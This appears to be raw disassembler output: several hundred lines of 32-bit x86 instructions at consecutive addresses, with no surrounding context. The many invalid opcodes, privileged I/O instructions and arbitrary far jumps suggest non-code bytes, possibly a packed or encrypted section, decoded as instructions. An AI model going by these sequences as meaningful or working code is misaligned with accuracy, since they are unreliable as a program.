  419ea0:	cmp    esi,DWORD PTR [ecx-0x1d02902f]
  419ea6:	push   cs
  419ea7:	xchg   esi,eax
  419ea8:	mov    al,0xf6
  419eaa:	nop
  419eab:	xchg   ecx,eax
  419eac:	adc    BYTE PTR [eax+ecx*2-0x14],ah
  419eb0:	add    BYTE PTR [eax],al
  419eb2:	in     al,0x50
  419eb4:	xor    al,0x96
  419eb6:	cmc    
  419eb7:	or     DWORD PTR [ebp+0xc43b067],0x9200001b
  419ec1:	add    esp,ebx
  419ec3:	ret    
  419ec4:	push   0xdfc0
  419ec9:	aad    0x82
  419ecb:	dec    edi
  419ecc:	sbb    ecx,edi
  419ece:	fild   WORD PTR ds:0xd38ac5fd
  419ed4:	pop    ds
  419ed5:	xchg   edi,eax
  419ed6:	jp     0x419eaf
  419ed8:	jl     0x419edc
  419eda:	sbb    BYTE PTR [edi+0x69],dh
  419edd:	mov    gs,WORD PTR [edx+0xd804]
  419ee3:	inc    eax
  419ee4:	inc    esi
  419ee5:	add    BYTE PTR [eax],al
  419ee7:	scas   eax,DWORD PTR es:[edi]
  419ee8:	pop    ss
  419ee9:	mov    edi,0x17b5fea
  419eee:	push   ebp
  419eef:	pop    DWORD PTR [edi]
  419ef1:	lea    eax,[edx+esi*1+0x0]
  419ef5:	add    BYTE PTR [ecx],al
  419ef7:	leave  
  419ef8:	lock in eax,dx
  419efa:	imul   ebx,DWORD PTR [ebp-0x3],0xffffffdd
  419efe:	fild   WORD PTR [edx]
  419f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f01:	or     BYTE PTR [edi+0x0],dl
  419f04:	add    BYTE PTR [esi],bh
  419f06:	inc    edx
  419f07:	icebp  
  419f08:	mov    edx,0xec71383d
  419f0d:	xor    DWORD PTR ds:0x32b48b2b,0xffffff9c
  419f14:	hlt    
  419f15:	inc    esi
  419f16:	fsubr  st(4),st
  419f18:	sbb    eax,0xde66abb
  419f1d:	fwait
  419f1e:	mov    ebp,0xc08a94f9
  419f23:	das    
  419f24:	add    BYTE PTR [eax],al
  419f26:	pop    es
  419f27:	dec    ebx
  419f28:	inc    ebx
  419f29:	test   al,0x3b
  419f2b:	(bad)  
  419f2c:	out    dx,al
  419f2d:	or     eax,0x2ef7d1b2
  419f32:	sbb    edi,DWORD PTR [esi+0x43]
  419f35:	in     al,0x90
  419f37:	stos   BYTE PTR es:[edi],al
  419f38:	pop    esi
  419f39:	mov    al,ds:0xe305ca8d
  419f3e:	ja     0x419f70
  419f40:	xchg   esp,eax
  419f41:	bound  edx,QWORD PTR [ebp-0x1c]
  419f44:	xchg   ebx,eax
  419f45:	ss sbb edi,esi
  419f48:	cmp    BYTE PTR [edx],ah
  419f4a:	mov    ebx,0xa4cbee78
  419f4f:	ficomp DWORD PTR [ebx]
  419f51:	out    0x2,al
  419f53:	retf   
  419f54:	into   
  419f55:	xchg   edx,eax
  419f56:	aas    
  419f57:	pop    esi
  419f58:	das    
  419f59:	add    DWORD PTR [ecx],edi
  419f5b:	scas   al,BYTE PTR es:[edi]
  419f5c:	mov    esi,DWORD PTR [ebx+0x41]
  419f5f:	sub    al,0x40
  419f61:	rol    BYTE PTR [eax],cl
  419f63:	add    BYTE PTR [edi+0x8],al
  419f66:	push   edi
  419f67:	add    BYTE PTR [eax],al
  419f69:	clc    
  419f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f6b:	inc    esi
  419f6c:	test   eax,0x3974257e
  419f71:	scas   al,BYTE PTR es:[edi]
  419f72:	into   
  419f73:	or     ebx,DWORD PTR [ecx-0x14be847a]
  419f79:	mov    al,0xf4
  419f7b:	in     eax,dx
  419f7c:	and    DWORD PTR [ebp-0x26a42da1],ebp
  419f82:	sti    
  419f83:	jbe    0x419ff7
  419f85:	(bad)  
  419f86:	sbb    BYTE PTR [edx],ch
  419f88:	stos   DWORD PTR es:[edi],eax
  419f89:	push   eax
  419f8a:	ret    0xa760
  419f8d:	jl     0x419fd4
  419f8f:	xor    ecx,DWORD PTR [ebx+edx*4+0x55340000]
  419f96:	(bad)  
  419f97:	hlt    
  419f98:	cld    
  419f99:	outs   dx,DWORD PTR ds:[esi]
  419f9a:	inc    eax
  419f9b:	das    
  419f9c:	add    BYTE PTR [eax],al
  419f9e:	mov    cs:0x7d3f58d2,al
  419fa4:	cmp    esi,edx
  419fa6:	mov    dl,0xda
  419fa8:	in     al,0xa9
  419faa:	push   edi
  419fab:	xor    al,0xa3
  419fad:	or     eax,0xb799fb21
  419fb2:	(bad)  
  419fb3:	fisub  WORD PTR [eax+0x215463fe]
  419fb9:	mov    ch,0xb1
  419fbb:	adc    al,0x62
  419fbd:	retf   
  419fbe:	mov    al,ds:0xfc8875f8
  419fc3:	add    BYTE PTR [eax],al
  419fc5:	add    BYTE PTR [eax],al
  419fc7:	add    BYTE PTR [eax],al
  419fc9:	(bad)  
  419fcb:	xchg   ecx,eax
  419fcc:	into   
  419fcd:	sbb    dl,BYTE PTR [ebx+0x28a1b167]
  419fd3:	imul   ebx,ebx,0x6b94a56
  419fd9:	jbe    0x419fc4
  419fdb:	test   DWORD PTR [edx],0x228c
  419fe1:	in     al,0x38
  419fe3:	mov    bl,0x7e
  419fe5:	sbb    al,0x1a
  419fe7:	(bad)  
  419fe8:	loopne 0x419ffe
  419fea:	mov    edx,0xd6d2578e
  419fef:	out    0x5e,eax
  419ff1:	lods   al,BYTE PTR ds:[esi]
  419ff2:	in     al,0x9e
  419ff4:	push   esp
  419ff5:	stos   DWORD PTR es:[edi],eax
  419ff6:	mov    al,ds:0xdc8784b
  419ffb:	add    BYTE PTR [eax],al
  419ffd:	aam    0x50
  419fff:	cmp    eax,0xc50cd0
  41a004:	add    dh,dh
  41a006:	push   0x2beddc7f
  41a00b:	(bad)  [ebx-0x462ecaa4]
  41a011:	mov    edx,0xcb84ac7d
  41a016:	add    BYTE PTR [eax],al
  41a018:	adc    BYTE PTR [ecx+0x53981cd9],0x81
  41a01f:	sub    al,0xd
  41a021:	sub    esi,DWORD PTR [ecx]
  41a023:	bound  eax,QWORD PTR [edx-0x78]
  41a026:	jno    0x41a028
  41a028:	add    ch,bh
  41a02a:	inc    eax
  41a02b:	rol    DWORD PTR [eax],0x0
  41a02e:	in     al,dx
  41a02f:	or     DWORD PTR [esi-0x63],0xac294d9b
  41a036:	adc    cl,BYTE PTR [ecx]
  41a038:	sbb    BYTE PTR [ebx+eiz*2],ch
  41a03b:	lock icebp 
  41a03d:	sbb    al,0xfa
  41a03f:	cmp    al,0xfb
  41a041:	adc    BYTE PTR [ecx-0x2c],dl
  41a044:	pop    ds
  41a045:	and    ah,BYTE PTR [esi+0x620459]
  41a04b:	add    BYTE PTR [edi-0x12],ch
  41a04e:	dec    esp
  41a04f:	or     al,BYTE PTR [eax]
  41a051:	add    BYTE PTR [edi+0x2481fd57],dh
  41a057:	mov    bh,0x29
  41a059:	repz jae 0x41a04a
  41a05c:	mov    bh,0x3d
  41a05e:	inc    esi
  41a05f:	mov    BYTE PTR [edx],al
  41a061:	add    BYTE PTR [eax],al
  41a063:	inc    esi
  41a064:	pushf  
  41a065:	inc    ebx
  41a066:	mov    ds:0x7eead0a5,al
  41a06b:	xchg   ecx,eax
  41a06c:	xchg   BYTE PTR [esi-0x8b02fb7],ch
  41a072:	stos   DWORD PTR es:[edi],eax
  41a073:	mov    ds:0xb655ffd9,eax
  41a078:	dec    eax
  41a079:	mov    eax,0x27210000
  41a07e:	mov    bh,0xcc
  41a080:	adc    al,0x0
  41a082:	add    BYTE PTR [esp+ebx*4-0x3e],ch
  41a086:	push   cs
  41a087:	data16 sbb BYTE PTR [edx-0x64],bh
  41a08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a08d:	xor    eax,0x7a9d05e4
  41a092:	into   
  41a093:	clc    
  41a094:	ret    
  41a095:	(bad)  
  41a097:	repnz nop
  41a099:	test   DWORD PTR [ecx],esp
  41a09b:	fst    DWORD PTR [ebp+esi*2+0x33e66877]
  41a0a2:	mov    al,ds:0x8d8062
  41a0a7:	add    BYTE PTR [ebx+0x27],al
  41a0aa:	sub    ch,0x0
  41a0ad:	add    BYTE PTR [edi-0x4533a0ac],al
  41a0b3:	add    BYTE PTR [eax],al
  41a0b5:	les    ecx,FWORD PTR [ecx+0x0]
  41a0b8:	add    BYTE PTR [ebx+0x3c2df3c2],cl
  41a0be:	pop    ebx
  41a0bf:	fst    QWORD PTR [ebp-0x6e]
  41a0c2:	push   ss
  41a0c3:	mov    al,0xa8
  41a0c5:	inc    edi
  41a0c6:	nop
  41a0c7:	dec    esp
  41a0c8:	scas   eax,DWORD PTR es:[edi]
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	and    DWORD PTR ss:[ebx-0x4958366e],ecx
  41a0d2:	sub    bl,ch
  41a0d4:	sub    al,BYTE PTR [esi]
  41a0d6:	fwait
  41a0d7:	scas   eax,DWORD PTR es:[edi]
  41a0d8:	xchg   edi,eax
  41a0d9:	ins    BYTE PTR es:[edi],dx
  41a0da:	jb     0x41a121
  41a0dc:	pusha  
  41a0dd:	(bad)  
  41a0de:	enter  0x9c,0x0
  41a0e2:	mov    esi,0xad388b0d
  41a0e7:	push   cs
  41a0e8:	lds    edx,FWORD PTR [ebp+ecx*8-0x7a]
  41a0ec:	jbe    0x41a155
  41a0ee:	(bad)  
  41a0ef:	sahf   
  41a0f0:	jbe    0x41a0b1
  41a0f2:	fpatan 
  41a0f4:	fdivr  st,st(4)
  41a0f6:	and    ecx,edi
  41a0f8:	fidiv  WORD PTR [esi+edi*4+0x13]
  41a0fc:	mov    BYTE PTR [ecx],bl
  41a0fe:	add    BYTE PTR [eax],al
  41a100:	gs push cs
  41a102:	loop   0x41a10e
  41a104:	repnz lahf 
  41a106:	inc    ecx
  41a107:	sbb    edi,DWORD PTR [ebx+0x5629fdf3]
  41a10d:	sub    DWORD PTR ds:0xc5efcb3d,0xffffff96
  41a114:	jg     0x41a14c
  41a116:	mov    eax,0xc557dbe9
  41a11b:	add    ecx,DWORD PTR [eax-0x21ffff0d]
  41a121:	pop    ds
  41a122:	nop
  41a123:	rcl    cl,cl
  41a125:	push   eax
  41a126:	pusha  
  41a127:	in     al,dx
  41a128:	inc    ebp
  41a129:	test   bl,0x14
  41a12c:	xchg   ecx,eax
  41a12d:	dec    edi
  41a12e:	daa    
  41a12f:	out    dx,al
  41a130:	fcomp  st(6)
  41a132:	imul   ebp,DWORD PTR [edi-0x5c7787ab],0x0
  41a139:	add    BYTE PTR [ecx-0x172b8c52],al
  41a13f:	xor    eax,DWORD PTR [eax-0x78ffff3e]
  41a145:	add    DWORD PTR [esi-0x430c4adf],ebp
  41a14b:	inc    esi
  41a14c:	imul   esp,ebx,0xffffffc3
  41a14f:	mov    ebp,0xdb0abd0d
  41a154:	and    eax,0x2487ec0a
  41a159:	mov    bl,0x75
  41a15b:	and    edx,DWORD PTR [esi+eiz*8+0x1ac82128]
  41a162:	add    BYTE PTR [eax],al
  41a164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a165:	dec    edx
  41a166:	rol    DWORD PTR [edx-0x3e],1
  41a169:	add    BYTE PTR [eax],ch
  41a16b:	add    BYTE PTR [eax],al
  41a16d:	add    bh,BYTE PTR [ecx]
  41a16f:	clc    
  41a170:	inc    edx
  41a171:	repz pop edx
  41a173:	lahf   
  41a174:	inc    eax
  41a175:	inc    DWORD PTR [eax]
  41a177:	add    BYTE PTR [esp+ebp*8-0x14],ch
  41a17b:	sub    edi,DWORD PTR [ebp-0x5c]
  41a17e:	mov    esi,edi
  41a180:	aaa    
  41a181:	stc    
  41a182:	cmp    BYTE PTR [eax],ah
  41a184:	sbb    esi,DWORD PTR [edx+0x3ef181ba]
  41a18a:	scas   eax,DWORD PTR es:[edi]
  41a18b:	pop    ecx
  41a18c:	jne    0x41a1a9
  41a18e:	(bad)  
  41a18f:	sbb    eax,0xe6078b2a
  41a194:	ins    BYTE PTR es:[edi],dx
  41a195:	or     dl,BYTE PTR [esi-0x217407d5]
  41a19b:	add    BYTE PTR [esp+ebx*4+0x0],0x0
  41a1a0:	push   ebx
  41a1a1:	xor    edx,DWORD PTR [ebx+esi*1-0x14e2c50c]
  41a1a8:	sub    bh,BYTE PTR [esp+ebp*4+0x44f42df0]
  41a1af:	test   al,0x0
  41a1b1:	add    BYTE PTR [eax-0x7a84fd6c],dl
  41a1b7:	hlt    
  41a1b8:	add    DWORD PTR [edx+ebp*4+0x57a8999f],ebp
  41a1bf:	test   edx,ebx
  41a1c1:	test   al,0x58
  41a1c3:	cwde   
  41a1c4:	sub    BYTE PTR [esi+0x79],ah
  41a1c7:	mov    DWORD PTR es:[ebx],ebp
  41a1ca:	dec    eax
  41a1cb:	sti    
  41a1cc:	add    BYTE PTR [eax],al
  41a1ce:	pop    esp
  41a1cf:	pushf  
  41a1d0:	mov    dh,0xca
  41a1d2:	mov    esi,0x182653e0
  41a1d7:	or     bh,bl
  41a1d9:	xchg   bl,cl
  41a1db:	lods   eax,DWORD PTR ds:[esi]
  41a1dc:	xchg   ebx,eax
  41a1dd:	loopne 0x41a1fd
  41a1df:	fidivr DWORD PTR [esi+esi*8]
  41a1e2:	(bad)  
  41a1e3:	xor    al,0x74
  41a1e5:	jmp    0x5e51:0x7aa7682e
  41a1ec:	jo     0x41a1ce
  41a1ee:	mov    esi,0xcd7fcf16
  41a1f3:	sbb    bh,al
  41a1f5:	sbb    eax,0x7b57f28a
  41a1fa:	(bad)  
  41a1fb:	dec    ecx
  41a1fc:	daa    
  41a1fd:	fiadd  DWORD PTR [esi]
  41a1ff:	sbb    al,0xb5
  41a201:	inc    edx
  41a202:	dec    esi
  41a203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a205:	inc    eax
  41a206:	mov    BYTE PTR [eax],al
  41a208:	add    BYTE PTR [ebp+0x72],ch
  41a20b:	sbb    BYTE PTR [ecx+0x6bc8f6],dl
  41a211:	add    BYTE PTR [edi],bh
  41a213:	sbb    DWORD PTR [eax-0x62],edi
  41a216:	enter  0x36,0x0
  41a21a:	xchg   BYTE PTR [ebx],ch
  41a21c:	mulps  xmm4,xmm4
  41a21f:	pushf  
  41a220:	add    esp,DWORD PTR [edi+ebp*1-0x37]
  41a224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a225:	scas   al,BYTE PTR es:[edi]
  41a226:	pop    ecx
  41a227:	fucom  st(7)
  41a229:	scas   al,BYTE PTR es:[edi]
  41a22a:	in     eax,dx
  41a22b:	cmp    eax,0x99c8
  41a230:	cli    
  41a231:	lds    ecx,FWORD PTR [eax]
  41a233:	inc    eax
  41a234:	add    BYTE PTR [eax],al
  41a236:	xchg   esi,eax
  41a237:	pop    es
  41a238:	xchg   esp,eax
  41a239:	repnz sahf 
  41a23b:	jge    0x41a227
  41a23d:	xchg   bh,ah
  41a23f:	shr    DWORD PTR ds:0x4ea3f5c7,1
  41a245:	xor    BYTE PTR [edx-0x2c],dl
  41a248:	inc    ebp
  41a249:	lea    ecx,[edi+0x135417aa]
  41a24f:	scas   al,BYTE PTR es:[edi]
  41a250:	xchg   esi,eax
  41a251:	fs (bad) 
  41a253:	mov    cl,0x83
  41a255:	cmc    
  41a256:	in     eax,dx
  41a257:	push   ecx
  41a258:	xor    eax,edi
  41a25a:	pushf  
  41a25b:	push   ss
  41a25c:	fucomi st,st(7)
  41a25e:	cmp    bl,BYTE PTR [esi]
  41a260:	xchg   ebp,eax
  41a261:	stc    
  41a262:	(bad)  
  41a263:	xchg   esi,eax
  41a264:	jnp    0x41a2ca
  41a266:	jg     0x41a2b2
  41a268:	scas   eax,DWORD PTR es:[edi]
  41a269:	mov    BYTE PTR [ecx],dh
  41a26b:	add    BYTE PTR [eax],al
  41a26d:	aam    0x8d
  41a26f:	sbb    esp,0xffffffcd
  41a272:	clc    
  41a273:	jge    0x41a264
  41a275:	imul   ebx,DWORD PTR [edi-0x766600ba],0xffffffb1
  41a27c:	push   cs
  41a27d:	test   DWORD PTR [ebp+esi*8+0x0],ecx
  41a281:	add    BYTE PTR [edi-0x57481a64],ch
  41a287:	mov    al,ds:0xa7c0a71d
  41a28c:	add    BYTE PTR [eax],al
  41a28e:	dec    edx
  41a28f:	jae    0x41a240
  41a291:	adc    DWORD PTR [edi],edx
  41a293:	cli    
  41a294:	inc    ebx
  41a295:	pop    esi
  41a296:	enter  0xad,0x0
  41a29a:	xchg   ecx,eax
  41a29b:	and    al,0x21
  41a29d:	dec    ecx
  41a29e:	jnp    0x41a232
  41a2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a1:	mov    ah,0x74
  41a2a3:	xor    ebx,ecx
  41a2a5:	leave  
  41a2a6:	xchg   edx,eax
  41a2a7:	nop
  41a2a8:	inc    edx
  41a2a9:	lea    eax,[edx+0x1c77910b]
  41a2af:	call   DWORD PTR [ecx-0x277665a2]
  41a2b5:	imul   edi,ecx,0xffffffe0
  41a2b8:	fisub  DWORD PTR [ebx-0x3]
  41a2bb:	sbb    edi,esi
  41a2bd:	jmp    0xf15b5aec
  41a2c2:	retf   
  41a2c3:	sub    al,0xda
  41a2c5:	scas   al,BYTE PTR es:[edi]
  41a2c6:	pop    es
  41a2c7:	fistp  WORD PTR [ecx+0x3f]
  41a2ca:	inc    ebp
  41a2cb:	dec    esi
  41a2cc:	dec    ebp
  41a2cd:	sub    ebx,esi
  41a2cf:	adc    esp,ecx
  41a2d1:	xor    BYTE PTR [ecx+0x6e],cl
  41a2d4:	pop    ds
  41a2d5:	mov    ch,0xd5
  41a2d7:	xor    al,0xe6
  41a2d9:	xor    dl,BYTE PTR [edi+0xaa880e]
  41a2df:	add    BYTE PTR [edx-0x52],dh
  41a2e2:	bound  eax,QWORD PTR [ecx-0x2155b564]
  41a2e8:	jl     0x41a2a6
  41a2ea:	sub    BYTE PTR [edx+ebp*2],0x4
  41a2ee:	add    BYTE PTR ss:[eax],al
  41a2f1:	(bad)  
  41a2f2:	sahf   
  41a2f3:	lds    ebp,FWORD PTR [edx]
  41a2f5:	rcr    edi,0xec
  41a2f8:	lock mov eax,0xc6b2f566
  41a2fe:	int    0x9f
  41a300:	cmp    al,ch
  41a302:	cmp    eax,0xfa4d91e6
  41a307:	lea    ecx,[ebx+0x3a]
  41a30a:	rcr    BYTE PTR [ebp-0x2633a8eb],cl
  41a310:	add    BYTE PTR [eax],al
  41a312:	adc    bl,cl
  41a314:	ins    BYTE PTR es:[edi],dx
  41a315:	retf   
  41a316:	retf   0xc9bf
  41a319:	mov    edx,0xbd9853e7
  41a31e:	scas   al,BYTE PTR es:[edi]
  41a31f:	test   esi,0x6b80
  41a325:	(bad)  
  41a327:	lea    eax,[eax]
  41a329:	add    BYTE PTR [edx+0x67],dl
  41a32c:	iret   
  41a32d:	stos   DWORD PTR es:[edi],eax
  41a32e:	push   cs
  41a32f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a330:	xor    eax,DWORD PTR [ecx+0x18]
  41a333:	frstor gs:[ebp-0x6b]
  41a337:	lods   eax,DWORD PTR ds:[esi]
  41a338:	sahf   
  41a339:	addr16 xor bh,ch
  41a33c:	int    0x88
  41a33e:	and    DWORD PTR [eax],eax
  41a340:	add    BYTE PTR [eax],ah
  41a342:	enter  0xd6,0x0
  41a346:	(bad)  
  41a347:	fisubr DWORD PTR [edi-0x234bbe36]
  41a34d:	popa   
  41a34e:	pusha  
  41a34f:	push   ss
  41a350:	fcomp  QWORD PTR [eax-0x4f0b0327]
  41a356:	cmp    DWORD PTR [ebp+0x27da16da],0x35
  41a35d:	adc    BYTE PTR [eax+esi*1-0xbbb740a],dh
  41a364:	add    BYTE PTR [eax],al
  41a366:	jmp    0xa9b1:0xfa6fdd03
  41a36d:	sub    eax,0xe91846b1
  41a372:	lods   eax,DWORD PTR ds:[esi]
  41a373:	xor    DWORD PTR [esp+edx*2+0x2e877cee],esp
  41a37a:	and    cl,BYTE PTR [ebx]
  41a37c:	imul   esp,eax,0xe8b1898d
  41a382:	pop    eax
  41a383:	lods   al,BYTE PTR ds:[esi]
  41a384:	add    edx,DWORD PTR [ecx+0x6f]
  41a387:	stc    
  41a388:	lock (bad) [edx+0x402627ff]
  41a38f:	add    al,0x0
  41a391:	add    bl,ch
  41a393:	xchg   ecx,eax
  41a394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a395:	and    al,0x4e
  41a397:	fs cwde 
  41a399:	(bad)  
  41a39b:	or     DWORD PTR [eax-0x69],0x0
  41a39f:	add    bl,ch
  41a3a1:	pop    ss
  41a3a2:	xchg   esi,eax
  41a3a3:	dec    ebx
  41a3a4:	sub    DWORD PTR [edx+0x4bc8],0xffffffc5
  41a3ab:	dec    esp
  41a3ac:	lods   eax,DWORD PTR ds:[esi]
  41a3ad:	add    BYTE PTR [eax],al
  41a3af:	addr16 jae 0x41a427
  41a3b2:	lods   al,BYTE PTR ds:[esi]
  41a3b3:	lods   al,BYTE PTR ds:[si]
  41a3b5:	call   0xb4d0:0xd10b540a
  41a3bc:	mov    edi,0xe9d85827
  41a3c1:	mov    ds:0x7d062f0b,al
  41a3c6:	leave  
  41a3c7:	sbb    DWORD PTR ds:0x469ed021,edx
  41a3cd:	test   DWORD PTR ds:0x363f19fc,esi
  41a3d3:	test   DWORD PTR [ebx-0x8],esp
  41a3d6:	mov    dl,0x5c
  41a3d8:	aaa    
  41a3d9:	out    0x87,eax
  41a3db:	ret    
  41a3dc:	ins    DWORD PTR es:[edi],dx
  41a3dd:	pop    ds
  41a3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3df:	(bad)  
  41a3e0:	sub    BYTE PTR fs:0x6ab5bf25,0x5f
  41a3e8:	add    edi,DWORD PTR ds:0xdc2b81e
  41a3ee:	not    BYTE PTR [eax+0x78]
  41a3f1:	outs   dx,DWORD PTR ds:[esi]
  41a3f2:	mov    esp,0x276cf2d3
  41a3f7:	loopne 0x41a3d0
  41a3f9:	and    BYTE PTR ds:0x6884,dh
  41a3ff:	into   
  41a400:	or     dl,BYTE PTR [esi+eax*4]
  41a403:	lea    ebx,[esi]
  41a405:	fstp   DWORD PTR [ecx-0x4e2b558d]
  41a40b:	pop    eax
  41a40c:	(bad)  
  41a40d:	jb     0x41a41a
  41a40f:	imul   eax,DWORD PTR [eax+0x63],0x1a1e0000
  41a416:	mov    esi,0xc3687f69
  41a41b:	cmp    ch,BYTE PTR [ebx+ebp*4]
  41a41e:	(bad)  
  41a41f:	out    0xc9,al
  41a421:	ret    
  41a422:	mov    DWORD PTR cs:[ebx],ebx
  41a425:	cmp    al,0xd0
  41a427:	(bad)  
  41a429:	pop    esi
  41a42a:	cmp    eax,0xad18ceb1
  41a42f:	add    esp,DWORD PTR [eax-0x75]
  41a432:	fstp   QWORD PTR [ecx]
  41a434:	mov    DWORD PTR [eax+ebp*1],esi
  41a437:	cwde   
  41a438:	jge    0x41a4af
  41a43a:	or     BYTE PTR [ebp+0x0],cl
  41a43d:	add    BYTE PTR [esi+0x4c129af5],cl
  41a443:	xor    eax,0xafb60000
  41a448:	in     eax,dx
  41a449:	sti    
  41a44a:	inc    ecx
  41a44b:	out    0x5a,eax
  41a44d:	or     BYTE PTR [eax+0x0],al
  41a450:	add    BYTE PTR [esi],dh
  41a452:	repz aas 
  41a454:	sub    BYTE PTR [eax-0x1b60000],0x9b
  41a45b:	xchg   esi,eax
  41a45c:	aam    0xba
  41a45e:	jbe    0x41a3e5
  41a460:	pop    edi
  41a461:	jp     0x41a468
  41a463:	(bad)  
  41a464:	xchg   edi,eax
  41a465:	ins    BYTE PTR es:[edi],dx
  41a466:	xchg   ebx,eax
  41a467:	dec    ebp
  41a468:	leave  
  41a469:	pop    eax
  41a46a:	mov    dh,0xe3
  41a46c:	pop    es
  41a46d:	rcr    esi,1
  41a46f:	sub    esi,DWORD PTR [esi-0x5e4bc4b0]
  41a475:	sub    eax,0x1781e62e
  41a47a:	sub    bl,bh
  41a47c:	shl    ch,cl
  41a47e:	loop   0x41a444
  41a480:	hlt    
  41a481:	add    BYTE PTR [eax],al
  41a483:	cmc    
  41a484:	inc    ebx
  41a485:	xor    DWORD PTR [edi-0x72],0xe9cc70
  41a48c:	add    BYTE PTR [ecx-0x6d523679],ah
  41a492:	and    al,0x7e
  41a494:	inc    ebx
  41a495:	pop    ecx
  41a496:	mov    ds,WORD PTR [edx-0x7e0140c2]
  41a49c:	mov    ch,0xd8
  41a49e:	jge    0x41a4d9
  41a4a0:	mov    ah,0xeb
  41a4a2:	test   al,0x66
  41a4a4:	in     al,0xc
  41a4a6:	jl     0x41a4a8
  41a4a8:	add    BYTE PTR [edi+0x17],dh
  41a4ab:	shr    BYTE PTR [esi],1
  41a4ad:	in     eax,0x42
  41a4af:	cmp    DWORD PTR ds:0x7b59032e,esp
  41a4b5:	fist   WORD PTR [ecx]
  41a4b7:	mov    DWORD PTR [edi-0xf],edx
  41a4ba:	test   BYTE PTR [esi+0x49030000],al
  41a4c0:	and    BYTE PTR [edx+0x3b21e9f7],bl
  41a4c6:	adc    bh,BYTE PTR [esi+0x38a83a20]
  41a4cc:	lds    ebx,FWORD PTR [ecx-0x1]
  41a4cf:	sbb    eax,0x969860f0
  41a4d4:	rcr    BYTE PTR [ebx+0x3484],cl
  41a4da:	push   ebp
  41a4db:	inc    edx
  41a4dc:	xchg   ebx,eax
  41a4dd:	xor    DWORD PTR [ecx+0x18],eax
  41a4e0:	adc    esp,0x38
  41a4e3:	sar    BYTE PTR [ebx+0x72d60000],0x7c
  41a4ea:	retf   0x1c18
  41a4ed:	adc    ebp,edx
  41a4ef:	scas   eax,DWORD PTR es:[edi]
  41a4f0:	xlat   BYTE PTR ds:[ebx]
  41a4f1:	std    
  41a4f2:	iret   
  41a4f3:	add    eax,0x2564f33e
  41a4f8:	ja     0x41a47a
  41a4fa:	out    dx,al
  41a4fb:	add    BYTE PTR [eax],al
  41a4fd:	pop    eax
  41a4fe:	xchg   bh,dh
  41a500:	adc    al,0xcd
  41a502:	push   ebx
  41a503:	or     DWORD PTR [edx+0xe08],ebp
  41a509:	inc    edx
  41a50a:	sbb    al,0xf1
  41a50c:	lods   al,BYTE PTR ds:[esi]
  41a50d:	or     eax,0x7eb70e2b
  41a512:	dec    ebp
  41a513:	fdivr  QWORD PTR [esi-0x3575ee16]
  41a519:	cdq    
  41a51a:	mov    fs,esi
  41a51c:	ss (bad) 
  41a51e:	xchg   ebp,eax
  41a51f:	jno    0x41a58c
  41a521:	jmp    DWORD PTR [eax-0x3ee6a495]
  41a527:	mov    al,ds:0x3b2b9337
  41a52c:	stos   DWORD PTR es:[edi],eax
  41a52d:	or     dh,bh
  41a52f:	add    BYTE PTR [eax],al
  41a531:	and    DWORD PTR [edi-0x361b6618],0x146f75b9
  41a53b:	ins    BYTE PTR es:[edi],dx
  41a53c:	pop    eax
  41a53d:	cmp    ebx,DWORD PTR [ebp+0x5d]
  41a540:	sub    ecx,ebx
  41a542:	stos   DWORD PTR es:[edi],eax
  41a543:	mov    al,ds:0x33c0e0ab
  41a548:	add    BYTE PTR [eax],al
  41a54a:	push   0x23b2235c
  41a54f:	and    al,0x75
  41a551:	icebp  
  41a552:	dec    edi
  41a553:	cmp    BYTE PTR [eax+edi*8+0x12],bh
  41a557:	das    
  41a558:	inc    esp
  41a559:	or     BYTE PTR [eax],al
  41a55b:	add    BYTE PTR [esp+ebp*8+0x66],bl
  41a55f:	(bad)  
  41a560:	xor    dl,BYTE PTR [edx-0x6d3aabcf]
  41a566:	aas    
  41a567:	stc    
  41a568:	inc    ebx
  41a569:	adc    BYTE PTR [edx+0x4e8fa6da],bh
  41a56f:	mov    al,0x5d
  41a571:	xor    al,ah
  41a573:	imul   esi,esp,0x8095ce90
  41a579:	push   0xdab60000
  41a57e:	pop    es
  41a57f:	pop    edx
  41a580:	enter  0x97,0x0
  41a584:	scas   eax,DWORD PTR es:[edi]
  41a585:	stos   BYTE PTR es:[edi],al
  41a586:	push   edx
  41a587:	mov    ch,al
  41a589:	add    BYTE PTR [eax],al
  41a58b:	mul    DWORD PTR [esi-0xb]
  41a58e:	sub    esi,edi
  41a590:	add    ah,bl
  41a592:	add    BYTE PTR [eax],al
  41a594:	adc    esi,edx
  41a596:	jge    0x41a542
  41a598:	or     al,0x42
  41a59a:	add    BYTE PTR [eax],al
  41a59c:	and    BYTE PTR [edx-0x1b],bl
  41a59f:	shl    BYTE PTR [eax-0xa],cl
  41a5a2:	shl    BYTE PTR [ebx+0x6e],cl
  41a5a5:	ret    0x2e93
  41a5a8:	inc    esi
  41a5a9:	mov    dl,0xe7
  41a5ab:	js     0x41a601
  41a5ad:	adc    al,cl
  41a5af:	aaa    
  41a5b0:	add    BYTE PTR [eax],al
  41a5b2:	in     eax,0xb1
  41a5b4:	mov    WORD PTR [ebp+0x0],ss
  41a5b7:	add    bh,bh
  41a5b9:	adc    edi,edx
  41a5bb:	cld    
  41a5bc:	jno    0x41a5a1
  41a5be:	dec    ebp
  41a5bf:	ss inc eax
  41a5c1:	push   eax
  41a5c2:	add    BYTE PTR [eax],al
  41a5c4:	cmp    al,0xd0
  41a5c6:	add    DWORD PTR [edi+0x685e9f97],ebx
  41a5cc:	mov    al,0xac
  41a5ce:	ja     0x41a590
  41a5d0:	jnp    0x41a5d2
  41a5d2:	add    BYTE PTR [ebx],dh
  41a5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5d5:	repz imul edx,DWORD PTR [eax],0x7ae960e8
